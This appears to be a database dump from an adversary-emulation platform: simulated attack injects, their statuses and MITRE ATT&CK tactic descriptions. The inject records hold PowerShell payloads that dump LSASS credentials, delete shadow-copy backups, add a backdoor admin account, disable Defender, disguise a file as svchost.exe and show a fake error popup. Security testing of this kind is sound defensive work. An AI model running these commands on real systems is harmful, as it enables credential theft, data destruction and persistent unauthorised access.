88219178-f2ef-46ac-bb70-accaa295c41d	2026-01-16 08:45:00.985128+00	2026-01-16 08:45:00.985135+00	\N	\N	41ce0c39-b9f4-41c7-b899-bd0f356800f2	\N	DETECTION	\N	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[]	\N	21600	\N
53691bb5-0b23-43ca-a57b-d2712cd03d1f	2026-01-16 08:45:00.969313+00	2026-01-16 08:52:09.623304+00	\N	\N	41ce0c39-b9f4-41c7-b899-bd0f356800f2	\N	PREVENTION	\N	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[]	[{"type":"parent_process_name","value":"oaev-implant-41ce0c39-b9f4-41c7-b899-bd0f356800f2-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-16T08:45:29.401211995Z"},{"type":"end_date","value":"2026-01-16T08:52:09.617212Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
3bf58807-baf7-407b-aa3a-46df563d1cb7	2026-01-16 08:45:00.986361+00	2026-01-16 08:52:09.62537+00	\N	\N	41ce0c39-b9f4-41c7-b899-bd0f356800f2	\N	DETECTION	\N	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[]	[{"type":"parent_process_name","value":"oaev-implant-41ce0c39-b9f4-41c7-b899-bd0f356800f2-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"source_ipv6_address","value":"fe80::2bde:c43c:abfb:2051"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"source_ipv4_address","value":"10.0.0.46"},{"type":"start_date","value":"2026-01-16T08:45:29.401211995Z"},{"type":"end_date","value":"2026-01-16T08:52:09.617212Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
\.


--
-- Data for Name: injects_expectations_traces; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injects_expectations_traces (inject_expectation_trace_id, inject_expectation_trace_expectation, inject_expectation_trace_source_id, inject_expectation_trace_alert_name, inject_expectation_trace_alert_link, inject_expectation_trace_date, inject_expectation_trace_created_at, inject_expectation_trace_updated_at) FROM stdin;
\.


--
-- Data for Name: injects_statuses; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injects_statuses (status_id, status_inject, status_name, tracking_sent_date, tracking_end_date, status_payload_output) FROM stdin;
aa4e4e50-a430-4876-8f7a-abfcea19232f	dad12758-dbee-4646-aca3-bacaa332485c	SUCCESS	2026-01-09 15:33:04+00	2026-01-09 15:34:12.51658	{"payload_name":"Test - Scan Server","payload_description":"","payload_type":"Command","payload_cleanup_executor":null,"payload_command_blocks":[{"command_executor":"psh","command_content":"$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike \\"*Loopback*\\"}).IPAddress\\n$subnet = $ip.Substring(0, $ip.LastIndexOf('.'))\\n\\n1..20 | ForEach-Object {\\n    $target = \\"$subnet.$_\\"\\n    if (Test-Connection -ComputerName $target -Count 1 -Quiet) {\\n        try {\\n            # Try to resolve IP to Hostname\\n            $hostName = [System.Net.Dns]::GetHostEntry($target).HostName\\n            Write-Host \\"FOUND: IP=$target Name=$hostName\\"\\n        } catch {\\n            Write-Host \\"FOUND: IP=$target (No Hostname)\\"\\n        }\\n    }\\n}\\n","payload_cleanup_command":null}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
7fc8b978-95a6-4f57-9d36-1737195b0e2d	56984800-c07d-4aed-814a-11a19c816b26	SUCCESS	2026-01-09 15:30:03+00	2026-01-09 15:30:17.041804	{"payload_name":"Test - Download Payload","payload_description":"","payload_type":"Command","payload_cleanup_executor":null,"payload_command_blocks":[{"command_executor":"psh","command_content":"$Content = @\\"\\n@echo off\\necho Installing Flash Update...\\ntimeout /t 3\\necho Update Complete.\\n\\"@\\n\\nSet-Content -Path \\"$env:USERPROFILE\\\\\\\\Downloads\\\\\\\\FlashUpdate.bat\\" -Value $Content","payload_cleanup_command":null}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
0447072f-45f7-4064-bbcf-a16f45b1bc61	635fc963-f7b3-4468-ab3f-ad6271b2a22d	SUCCESS	2026-01-09 15:32:04+00	2026-01-09 15:32:32.098606	{"payload_name":"Test - Hide as System File","payload_description":"","payload_type":"Command","payload_cleanup_executor":null,"payload_command_blocks":[{"command_executor":"psh","command_content":"Move-Item -Path \\"$env:USERPROFILE\\\\Downloads\\\\FlashUpdate.bat\\" -Destination \\"C:\\\\Windows\\\\Temp\\\\svchost.exe\\" -Force\\n","payload_cleanup_command":null}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
da07f8e8-0716-42e6-9e59-1f233be0b471	5e2a54ac-74d9-4191-8a2e-aeb7e480c742	MAYBE_PREVENTED	2026-01-09 15:35:04+00	2026-01-09 15:35:19.146938	{"payload_name":"Test - Credential Dump","payload_description":"","payload_type":"Command","payload_cleanup_executor":null,"payload_command_blocks":[{"command_executor":"psh","command_content":"rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\\\lsass-dump.dmp full\\n","payload_cleanup_command":null}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
9a5c1f35-9a30-4dfc-93fc-41c96d04715b	27782be0-6497-48f6-9052-ca59d1a56205	SUCCESS	2026-01-09 15:37:03+00	2026-01-09 15:37:45.000923	{"payload_name":"Test - Escalate and Persist","payload_description":"","payload_type":"Command","payload_cleanup_executor":null,"payload_command_blocks":[{"command_executor":"psh","command_content":"$Content = @\\"\\n@echo off\\necho Beacons active...\\ntimeout /t 30\\n\\"@\\nSet-Content -Path \\"C:\\\\Windows\\\\Temp\\\\beacon.bat\\" -Value $Content\\nStart-Process -FilePath \\"C:\\\\Windows\\\\Temp\\\\beacon.bat\\" -WindowStyle Hidden","payload_cleanup_command":null}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
b23b845f-bdbf-4793-942c-d6a05c46490b	2343768a-1a7b-41bf-920b-ce4efd6cb99d	MAYBE_PREVENTED	2026-01-09 15:40:03+00	2026-01-09 15:40:21.451833	{"payload_name":"Test - Delete Backup","payload_description":"","payload_type":"Command","payload_cleanup_executor":null,"payload_command_blocks":[{"command_executor":"psh","command_content":"vssadmin.exe Delete Shadows /All /Quiet\\n","payload_cleanup_command":null}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
4827180e-a153-41c9-bc16-0208eddb1309	36daa8c0-d058-4347-badf-2822a38dd8b1	SUCCESS	2026-01-09 15:41:04+00	2026-01-09 15:41:28.527886	{"payload_name":"Test - Scan for Databases","payload_description":"","payload_type":"Command","payload_cleanup_executor":null,"payload_command_blocks":[{"command_executor":"psh","command_content":"Get-NetTCPConnection -State Listen\\n","payload_cleanup_command":null}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
981db260-aa30-481b-ba8b-b76218392d54	0d9e412f-7003-4545-a65f-26184b48b173	SUCCESS	2026-01-09 15:35:04+00	2026-01-09 15:37:32.804206	{"payload_name":"Test - Change Wallpaper","payload_description":"","payload_type":"Command","payload_cleanup_executor":null,"payload_command_blocks":[{"command_executor":"psh","command_content":"$url = \\"https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5\\"; $img = \\"$env:TEMP\\\\hacked.jpg\\"; Invoke-WebRequest $url -OutFile $img; Set-ItemProperty -path 'HKCU:\\\\Control Panel\\\\Desktop\\\\' -name wallpaper -value $img; rundll32.exe user32.dll, UpdatePerUserSystemParameters\\n","payload_cleanup_command":null}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
2418eae2-e78e-42b4-9860-2039edd65772	c58cdfeb-05e0-4160-8426-0ee508c331ba	SUCCESS	2026-01-09 15:53:03+00	2026-01-09 15:53:44.323483	{"payload_name":"Test - Clean Up Desktop","payload_description":"","payload_type":"Command","payload_cleanup_executor":null,"payload_command_blocks":[{"command_executor":"psh","command_content":"Remove-Item -Path \\"$env:USERPROFILE\\\\Downloads\\\\FlashUpdate.bat\\" -ErrorAction SilentlyContinue\\nRemove-Item -Path \\"C:\\\\Windows\\\\Temp\\\\svchost.exe\\" -ErrorAction SilentlyContinue\\nRemove-Item \\"$env:TEMP\\\\hacked.jpg\\" -ErrorAction SilentlyContinue\\n# Reset wallpaper to an empty string (or a default path)\\nSet-ItemProperty -path 'HKCU:\\\\Control Panel\\\\Desktop\\\\' -name wallpaper -value \\"\\"\\nrundll32.exe user32.dll, UpdatePerUserSystemParameters\\n","payload_cleanup_command":null}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
3b12b8a5-1851-4da2-8448-7ddc16af3485	88fb9ac5-0396-4b3e-be00-648b20ec7758	MAYBE_PREVENTED	2026-01-09 15:39:05+00	2026-01-09 15:39:45.116265	{"payload_name":"Test - Create Backdoor Admin","payload_description":"","payload_type":"Command","payload_cleanup_executor":null,"payload_command_blocks":[{"command_executor":"psh","command_content":"net user SysAdmin_Support P@ssw0rd123! /add; net localgroup Administrators SysAdmin_Support /add\\n","payload_cleanup_command":null}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
4d433da1-2d0d-4ee6-8880-875e18a80620	e123988d-c196-494a-bdf7-b367b76ef878	MAYBE_PREVENTED	2026-01-09 15:53:04+00	2026-01-09 15:53:44.070786	{"payload_name":"Test - Clean Up Server","payload_description":"","payload_type":"Command","payload_cleanup_executor":null,"payload_command_blocks":[{"command_executor":"psh","command_content":"net user SysAdmin_Support /delete\\nRemove-Item -Path \\"C:\\\\Windows\\\\Temp\\\\beacon.bat\\" -Force -ErrorAction SilentlyContinue\\n","payload_cleanup_command":null}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
e7c3a653-fda8-4b41-8361-3e95292002a3	5f5326d3-d9bb-4618-8d73-1ee582e96623	SUCCESS	2026-01-16 08:18:01+00	2026-01-16 08:18:12.508438	{"payload_name":"Test - Defense Evasion","payload_description":"","payload_type":"Command","payload_cleanup_executor":"psh","payload_command_blocks":[{"command_executor":"psh","command_content":"Set-MpPreference -DisableRealtimeMonitoring $true","payload_cleanup_command":["Set-MpPreference -DisableRealtimeMonitoring $false"]}],"payload_arguments":[],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
d522efe3-f72a-458e-8ce8-a0b2a8889ad7	41ce0c39-b9f4-41c7-b899-bd0f356800f2	SUCCESS	2026-01-16 08:45:01+00	2026-01-16 08:52:09.606917	{"payload_name":"Test - Social Engineer","payload_description":"","payload_type":"Command","payload_cleanup_executor":"psh","payload_command_blocks":[{"command_executor":"psh","command_content":"# Load Windows Forms assembly\\nAdd-Type -AssemblyName System.Windows.Forms\\n# Show a fake \\"System Error\\"\\n$msg=\\"#{message}\\"\\n[System.Windows.Forms.MessageBox]::Show($msg, \\"System Critical Error\\", 'OK', 'Error')","payload_cleanup_command":["Get-Process powershell | Where-Object {$_.MainWindowTitle -eq \\"System Critical Error\\"} | Stop-Process -Force -ErrorAction SilentlyContinue"]}],"payload_arguments":[{"type":"text","key":"message","default_value":"Your Windows License has expired. Please contact IT Support immediately","description":null,"separator":null}],"payload_prerequisites":[],"payload_external_id":null,"executable_file":null,"file_drop_file":null,"dns_resolution_hostname":null,"network_traffic_ip_src":null,"network_traffic_ip_dst":null,"network_traffic_port_src":null,"network_traffic_port_dst":null,"network_traffic_protocol":null}
\.


--
-- Data for Name: injects_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injects_tags (inject_id, tag_id) FROM stdin;
\.


--
-- Data for Name: injects_teams; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injects_teams (inject_id, team_id) FROM stdin;
5c755bbd-f265-4ece-a248-475287de4b9b	279b9f51-48f0-4e3c-bff2-5ce82e9171d9
515220ba-9cf0-435b-9c89-03ae2dee65bd	7a2c91a3-5440-410b-ab7d-2f34542acafe
515220ba-9cf0-435b-9c89-03ae2dee65bd	949f7d3e-12a3-4b63-b0d8-dd294cbe48de
\.


--
-- Data for Name: injects_tests_statuses; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injects_tests_statuses (status_id, status_name, tracking_sent_date, tracking_end_date, status_inject, status_created_at, status_updated_at) FROM stdin;
\.


--
-- Data for Name: kill_chain_phases; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.kill_chain_phases (phase_id, phase_created_at, phase_updated_at, phase_name, phase_kill_chain_name, phase_order, phase_description, phase_shortname, phase_external_id, phase_stix_id) FROM stdin;
300d7fd4-d933-4c55-bb2d-e618ef48a44b	2026-01-09 14:19:24.752289+00	2026-01-09 14:19:24.752292+00	Defense Evasion	mitre-attack	6	The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. 	defense-evasion	TA0005	x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a
43e359e0-03f6-4762-a268-c92466c87962	2026-01-09 14:19:24.796206+00	2026-01-09 14:19:24.79621+00	Execution	mitre-attack	3	The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. 	execution	TA0002	x-mitre-tactic--4ca45d45-df4d-4613-8980-bac22d278fa5
7dc074be-e649-4597-a977-a69db1f8f553	2026-01-09 14:19:24.816843+00	2026-01-09 14:19:24.816846+00	Command and Control	mitre-attack	11	The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.	command-and-control	TA0011	x-mitre-tactic--f72804c5-f15a-449e-a5da-2eecd181f813
fbaba4f5-7f73-49ca-9522-55d1a956473e	2026-01-09 14:19:25.21132+00	2026-01-09 14:19:25.211324+00	Discovery	mitre-attack	8	The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. 	discovery	TA0007	x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9
cd7cc761-74dc-4ac7-9d42-aad2db481b9e	2026-01-09 14:19:25.249748+00	2026-01-09 14:19:25.249751+00	Collection	mitre-attack	10	The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.	collection	TA0009	x-mitre-tactic--d108ce10-2419-4cf9-a774-46161d6c6cfe
3debd8b9-b6f2-4245-881e-b13454d03549	2026-01-09 14:19:25.520278+00	2026-01-09 14:19:25.520282+00	Lateral Movement	mitre-attack	9	The adversary is trying to move through your environment.\n\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier. 	lateral-movement	TA0008	x-mitre-tactic--7141578b-e50b-4dcc-bfa4-08a8dd689e9e
a01d46ef-7c20-490a-a36e-fd7c3a271820	2026-01-09 14:19:26.599832+00	2026-01-09 14:19:26.599835+00	Privilege Escalation	mitre-attack	5	The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  	privilege-escalation	TA0004	x-mitre-tactic--5e29b093-294e-49e9-a803-dab3d73b77dd
ccfc794e-6739-41bc-9652-b2f70224c56f	2026-01-09 14:19:26.618322+00	2026-01-09 14:19:26.618325+00	Persistence	mitre-attack	4	The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. 	persistence	TA0003	x-mitre-tactic--5bc1d813-693e-4823-9961-abf9af4b0e92
d46ee5cc-0ef4-4f59-a0b7-ba9c2fb9c993	2026-01-09 14:19:26.877108+00	2026-01-09 14:19:26.877111+00	Credential Access	mitre-attack	7	The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.	credential-access	TA0006	x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263
74ac7969-7326-49fc-b068-4580890e6d02	2026-01-09 14:19:27.068082+00	2026-01-09 14:19:27.068086+00	Exfiltration	mitre-attack	12	The adversary is trying to steal data.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.	exfiltration	TA0010	x-mitre-tactic--9a4e74ab-5008-408c-84bf-a10dfbc53462
\.


--
-- Data for Name: lessons_answers; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.lessons_answers (lessons_answer_id, lessons_answer_created_at, lessons_answer_updated_at, lessons_answer_positive, lessons_answer_negative, lessons_answer_score, lessons_answer_question, lessons_answer_user) FROM stdin;
\.


--
-- Data for Name: lessons_categories; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.lessons_categories (lessons_category_id, lessons_category_created_at, lessons_category_updated_at, lessons_category_name, lessons_category_description, lessons_category_order, lessons_category_exercise, lessons_category_scenario) FROM stdin;
\.


--
-- Data for Name: lessons_categories_teams; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.lessons_categories_teams (team_id, lessons_category_id) FROM stdin;
\.


--
-- Data for Name: lessons_questions; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.lessons_questions (lessons_question_id, lessons_question_created_at, lessons_question_updated_at, lessons_question_content, lessons_question_explanation, lessons_question_order, lessons_question_category) FROM stdin;
\.


--
-- Data for Name: lessons_template_categories; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.lessons_template_categories (lessons_template_category_id, lessons_template_category_created_at, lessons_template_category_updated_at, lessons_template_category_name, lessons_template_category_description, lessons_template_category_order, lessons_template_category_template) FROM stdin;
\.


--
-- Data for Name: lessons_template_questions; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.lessons_template_questions (lessons_template_question_id, lessons_template_question_created_at, lessons_template_question_updated_at, lessons_template_question_content, lessons_template_question_explanation, lessons_template_question_order, lessons_template_question_category) FROM stdin;
\.


--
-- Data for Name: lessons_templates; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.lessons_templates (lessons_template_id, lessons_template_created_at, lessons_template_updated_at, lessons_template_name, lessons_template_description) FROM stdin;
\.


--
-- Data for Name: logs; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.logs (log_id, log_exercise, log_user, log_title, log_content, log_created_at, log_updated_at) FROM stdin;
\.


--
-- Data for Name: logs_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.logs_tags (log_id, tag_id) FROM stdin;
\.


--
-- Data for Name: migrations; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.migrations (installed_rank, version, description, type, script, checksum, installed_by, installed_on, execution_time, success) FROM stdin;
1	1	Init	JDBC	io.openaev.migration.V1__Init	\N	user	2026-01-09 14:18:27.752735	962	t
2	2.1	Relative inject	JDBC	io.openaev.migration.V2_1__Relative_inject	\N	user	2026-01-09 14:18:28.883493	83	t
3	2.2	Simplify model	JDBC	io.openaev.migration.V2_2__Simplify_model	\N	user	2026-01-09 14:18:29.009238	304	t
4	2.3	Nullable exercise dates	JDBC	io.openaev.migration.V2_3__Nullable_exercise_dates	\N	user	2026-01-09 14:18:29.371465	17	t
5	2.4	Creation update cleanup	JDBC	io.openaev.migration.V2_4__Creation_update_cleanup	\N	user	2026-01-09 14:18:29.430776	85	t
6	2.5	Organization tags	JDBC	io.openaev.migration.V2_5__Organization_tags	\N	user	2026-01-09 14:18:29.566706	26	t
7	2.6	User tags	JDBC	io.openaev.migration.V2_6__User_tags	\N	user	2026-01-09 14:18:29.605216	12	t
8	2.7	Model adaptation	JDBC	io.openaev.migration.V2_7__Model_adaptation	\N	user	2026-01-09 14:18:29.628951	10	t
9	2.8	Cleanup model	JDBC	io.openaev.migration.V2_8__Cleanup_model	\N	user	2026-01-09 14:18:29.662087	12	t
10	2.9	Improve model	JDBC	io.openaev.migration.V2_9__Improve_model	\N	user	2026-01-09 14:18:29.68808	18	t
11	2.10	Improve audience	JDBC	io.openaev.migration.V2_10__Improve_audience	\N	user	2026-01-09 14:18:29.735627	25	t
12	2.11	Improve inject	JDBC	io.openaev.migration.V2_11__Improve_inject	\N	user	2026-01-09 14:18:29.799384	66	t
13	2.12	Improve audience	JDBC	io.openaev.migration.V2_12__Improve_audience	\N	user	2026-01-09 14:18:29.900113	16	t
14	2.13	Nullable inject description	JDBC	io.openaev.migration.V2_13__Nullable_inject_description	\N	user	2026-01-09 14:18:29.962608	25	t
15	2.14	Cleanup cascade organization	JDBC	io.openaev.migration.V2_14__Cleanup_cascade_organization	\N	user	2026-01-09 14:18:30.044986	58	t
16	2.15	Nullable exercise subtitle	JDBC	io.openaev.migration.V2_15__Nullable_exercise_subtitle	\N	user	2026-01-09 14:18:30.159739	17	t
17	2.16	Cleanup exercise	JDBC	io.openaev.migration.V2_16__Cleanup_exercise	\N	user	2026-01-09 14:18:30.232273	17	t
18	2.17	Default group	JDBC	io.openaev.migration.V2_17__Default_group	\N	user	2026-01-09 14:18:30.275971	15	t
19	2.18	Exercise workflow	JDBC	io.openaev.migration.V2_18__Exercise_workflow	\N	user	2026-01-09 14:18:30.334387	15	t
20	2.19	Audience tags cascade	JDBC	io.openaev.migration.V2_19__Audience_tags_cascade	\N	user	2026-01-09 14:18:30.379874	49	t
21	2.20	Improve user	JDBC	io.openaev.migration.V2_20__Improve_user	\N	user	2026-01-09 14:18:30.463201	25	t
22	2.21	Comcheck refactor	JDBC	io.openaev.migration.V2_21__Comcheck_refactor	\N	user	2026-01-09 14:18:30.513783	60	t
23	2.22	Comcheck template	JDBC	io.openaev.migration.V2_22__Comcheck_template	\N	user	2026-01-09 14:18:30.589981	13	t
24	2.23	Tags cascade	JDBC	io.openaev.migration.V2_23__Tags_cascade	\N	user	2026-01-09 14:18:30.624845	139	t
25	2.24	Improve dryrun	JDBC	io.openaev.migration.V2_24__Improve_dryrun	\N	user	2026-01-09 14:18:30.772778	45	t
26	2.25	Feedback start	JDBC	io.openaev.migration.V2_25__Feedback_start	\N	user	2026-01-09 14:18:30.827432	108	t
27	2.26	Improve objective	JDBC	io.openaev.migration.V2_26__Improve_objective	\N	user	2026-01-09 14:18:30.965847	20	t
28	2.27	Document refactor	JDBC	io.openaev.migration.V2_27__Document_refactor	\N	user	2026-01-09 14:18:30.993114	57	t
29	2.28	Dryinject link	JDBC	io.openaev.migration.V2_28__Dryinject_link	\N	user	2026-01-09 14:18:31.0612	44	t
30	2.29	Documents exercise	JDBC	io.openaev.migration.V2_29__Documents_exercise	\N	user	2026-01-09 14:18:31.123078	35	t
31	2.30	Document path	JDBC	io.openaev.migration.V2_30__Document_path	\N	user	2026-01-09 14:18:31.176613	3	t
32	2.31	Controls name	JDBC	io.openaev.migration.V2_31__Controls_name	\N	user	2026-01-09 14:18:31.193391	13	t
33	2.32	Inject contract	JDBC	io.openaev.migration.V2_32__Inject_contract	\N	user	2026-01-09 14:18:31.224368	4	t
34	2.33	Inject not null	JDBC	io.openaev.migration.V2_33__Inject_not_null	\N	user	2026-01-09 14:18:31.25985	25	t
35	2.34	Inject communication	JDBC	io.openaev.migration.V2_34__Inject_communication	\N	user	2026-01-09 14:18:31.293048	52	t
36	2.35	Inject communication ack	JDBC	io.openaev.migration.V2_35__Inject_communication_ack	\N	user	2026-01-09 14:18:31.368067	10	t
37	2.36	Inject communication animation	JDBC	io.openaev.migration.V2_36__Inject_communication_animation	\N	user	2026-01-09 14:18:31.400799	3	t
38	2.37	Media introduction	JDBC	io.openaev.migration.V2_37__Media_introduction	\N	user	2026-01-09 14:18:31.42469	94	t
39	2.38	Challenge flags	JDBC	io.openaev.migration.V2_38__Challenge_flags	\N	user	2026-01-09 14:18:31.548288	22	t
40	2.39	Expectation denorm	JDBC	io.openaev.migration.V2_39__Expectation_denorm	\N	user	2026-01-09 14:18:31.578551	26	t
41	2.40	Expectation doc name	JDBC	io.openaev.migration.V2_40__Expectation_doc_name	\N	user	2026-01-09 14:18:31.614152	2	t
42	2.41	Cleanup article	JDBC	io.openaev.migration.V2_41__Cleanup_article	\N	user	2026-01-09 14:18:31.649785	4	t
43	2.42	Inject communication fields	JDBC	io.openaev.migration.V2_42__Inject_communication_fields	\N	user	2026-01-09 14:18:31.661775	18	t
44	2.43	Expectation audience	JDBC	io.openaev.migration.V2_43__Expectation_audience	\N	user	2026-01-09 14:18:31.701985	6	t
45	2.44	Inject communication fields	JDBC	io.openaev.migration.V2_44__Inject_communication_fields	\N	user	2026-01-09 14:18:31.715913	3	t
46	2.45	Media upgrade	JDBC	io.openaev.migration.V2_45__Media_upgrade	\N	user	2026-01-09 14:18:31.727468	25	t
47	2.46	Expectation upgrade	JDBC	io.openaev.migration.V2_46__Expectation_upgrade	\N	user	2026-01-09 14:18:31.762754	29	t
48	2.47	Media upgrade	JDBC	io.openaev.migration.V2_47__Media_upgrade	\N	user	2026-01-09 14:18:31.80185	3	t
49	2.48	Media upgrade	JDBC	io.openaev.migration.V2_48__Media_upgrade	\N	user	2026-01-09 14:18:31.812846	15	t
50	2.49	Change foreign key document	JDBC	io.openaev.migration.V2_49__Change_foreign_key_document	\N	user	2026-01-09 14:18:31.839954	21	t
51	2.50	Challenges	JDBC	io.openaev.migration.V2_50__Challenges	\N	user	2026-01-09 14:18:31.869435	13	t
52	2.51	Challenges documents	JDBC	io.openaev.migration.V2_51__Challenges_documents	\N	user	2026-01-09 14:18:31.904737	9	t
53	2.52	Challenges documents	JDBC	io.openaev.migration.V2_52__Challenges_documents	\N	user	2026-01-09 14:18:31.940766	2	t
